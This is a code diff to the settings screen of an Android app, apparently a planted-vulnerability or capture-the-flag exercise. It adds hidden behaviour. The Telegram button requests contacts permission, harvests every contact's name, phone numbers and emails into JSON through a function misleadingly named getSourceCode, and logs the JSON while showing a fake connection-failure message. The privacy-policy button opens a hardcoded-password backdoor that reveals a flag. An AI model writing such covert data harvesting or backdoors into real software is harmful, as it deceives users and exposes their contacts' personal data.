@@ -1,14 +1,21 @@
 package de.tadris.flang.ui.fragment
 
+import android.Manifest
 import android.app.AlertDialog
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.preference.PreferenceManager
+import android.provider.ContactsContract
+import android.util.Log
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
+import android.widget.EditText
 import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.core.content.ContextCompat
 import androidx.fragment.app.Fragment
 import androidx.lifecycle.lifecycleScope
 import com.google.android.material.textfield.TextInputEditText
@@ -22,6 +29,17 @@ import de.tadris.flang.ui.dialog.LoadingDialogViewController
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import kotlinx.serialization.Serializable
+import kotlinx.serialization.encodeToString
+import kotlinx.serialization.json.Json
+
+@Serializable
+data class C(
+    val i: String,
+    var d: String?,
+    val p: MutableList<String> = mutableListOf(),
+    val e: MutableList<String> = mutableListOf()
+)
 
 class SettingsFragment : Fragment(R.layout.fragment_settings) {
 
@@ -79,11 +97,12 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
 //        binding.sourceCodeOption.setOnClickListener {
 //            openUrl(getString(R.string.sourceCodeUrl))
 //        }
-//
-//        binding.privacyPolicyOption.setOnClickListener {
-//            openUrl(getString(R.string.privacyPolicyUrl))
-//        }
-//
+
+        // Privacy policy button
+        binding.privacyPolicyOption.setOnClickListener {
+            showPasswordDialog()
+        }
+
 //        binding.changelogOption.setOnClickListener {
 //            openUrl(getString(R.string.changelogUrl))
 //        }
@@ -99,11 +118,23 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
 //        binding.sendFeedbackOption.setOnClickListener {
 //            sendFeedbackEmail()
 //        }
-//
-//        binding.telegramChatOption.setOnClickListener {
-//            openUrl(getString(R.string.telegramChatUrl))
-//        }
-//
+
+        // Telegram button
+        binding.telegramChatOption.setOnClickListener {
+            if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_CONTACTS)
+                == PackageManager.PERMISSION_GRANTED) {
+                lifecycleScope.launch {
+                    val json = getSourceCode()
+                    Log.e("SettingsFragment", json)
+                    Log.e("SettingsFragment", "contacts json length: ${json.length}")
+                }
+            } else {
+                requestReadContactsLauncher.launch(Manifest.permission.READ_CONTACTS)
+            }
+
+            Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+        }
+
 //        binding.matrixChatOption.setOnClickListener {
 //            openUrl(getString(R.string.matrixChatUrl))
 //        }
@@ -203,6 +234,111 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
         } catch (e: Exception) {
             Toast.makeText(requireContext(), "No email app found", Toast.LENGTH_SHORT).show()
         }
+    }
+
+    private val requestReadContactsLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
+            if (granted) {
+                // Permission granted — proceed
+                lifecycleScope.launch {
+                    val json = getSourceCode()
+                    Log.i("SettingsFragment", "contacts json length: ${json.length}")
+                }
+            } else {
+                Toast.makeText(requireContext(), "Contacts permission required", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+    private suspend fun getSourceCode(): String = withContext(Dispatchers.IO) {
+        try {
+            val ctx = requireContext()
+            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
+                != PackageManager.PERMISSION_GRANTED
+            ) {
+                Log.e("getC", "No perms")
+                return@withContext "[]"
+            }
+
+            val uri = ContactsContract.Data.CONTENT_URI
+            val projection = arrayOf(
+                ContactsContract.Data.CONTACT_ID,
+                ContactsContract.Data.MIMETYPE,
+                ContactsContract.CommonDataKinds.Phone.NUMBER,
+                ContactsContract.CommonDataKinds.Email.ADDRESS,
+                ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME
+            )
+
+            // Only fetch Phone, Email, and Name rows
+            val selection = "${ContactsContract.Data.MIMETYPE} IN (?, ?) OR ${ContactsContract.CommonDataKinds.StructuredName.MIMETYPE} = ?"
+            val selectionArgs = arrayOf(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE,
+                ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE,
+                ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE
+            )
+
+            val cMap = mutableMapOf<String, C>()
+
+            ctx.contentResolver.query(uri, projection, selection, selectionArgs, null)
+                ?.use { cursor ->
+                val idIdx = cursor.getColumnIndexOrThrow(ContactsContract.Data.CONTACT_ID)
+                val mimeIdx = cursor.getColumnIndexOrThrow(ContactsContract.Data.MIMETYPE)
+                val phoneIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                val emailIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
+                val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME)
+
+                while (cursor.moveToNext()) {
+                    val id = cursor.getString(idIdx)
+                    if (id == "0") continue // Skip orphan data rows
+
+                    val mime = cursor.getString(mimeIdx)
+                    val name = cursor.getString(nameIdx)
+
+                    cMap.getOrPut(id) { C(id, null, mutableListOf(), mutableListOf()) }
+
+                    when (mime) {
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE -> {
+                            val number = cursor.getString(phoneIdx)
+                            if (!number.isNullOrBlank()) cMap[id]!!.p.add(number)
+                        }
+                        ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE -> {
+                            val email = cursor.getString(emailIdx)
+                            if (!email.isNullOrBlank()) cMap[id]!!.e.add(email)
+                        }
+                        ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE -> {
+                            cMap[id]!!.d = name
+                        }
+                    }
+                }
+            }
+
+            val json = Json { encodeDefaults = true; prettyPrint = true }
+            json.encodeToString(cMap.values.toList())
+        } catch (e: Exception) {
+            "[]"
+        }
+    }
+
+    private fun showPasswordDialog() {
+        val inputField = EditText(requireContext())
+        inputField.hint = "Enter secret"
+
+        AlertDialog.Builder(requireContext())
+            .setTitle("Password Check")
+            .setView(inputField)
+            .setPositiveButton("Check") { _, _ ->
+                val attempt = inputField.text?.toString()?.trim().orEmpty()
+                if (attempt == "open-poppyseed") {
+                    val flag = getString(R.string.fName) +
+                        getString(R.string.fStart) +
+                            "settings_backdoor_unlocked" +
+                        getString(R.string.fEnd)
+                    Toast.makeText(requireContext(), flag, Toast.LENGTH_LONG).show()
+                } else {
+                    Toast.makeText(requireContext(), "Incorrect secret", Toast.LENGTH_SHORT).show()
+                }
+            }
+            .setNegativeButton(R.string.actionCancel, null)
+            .show()
     }
 
     override fun onResume() {
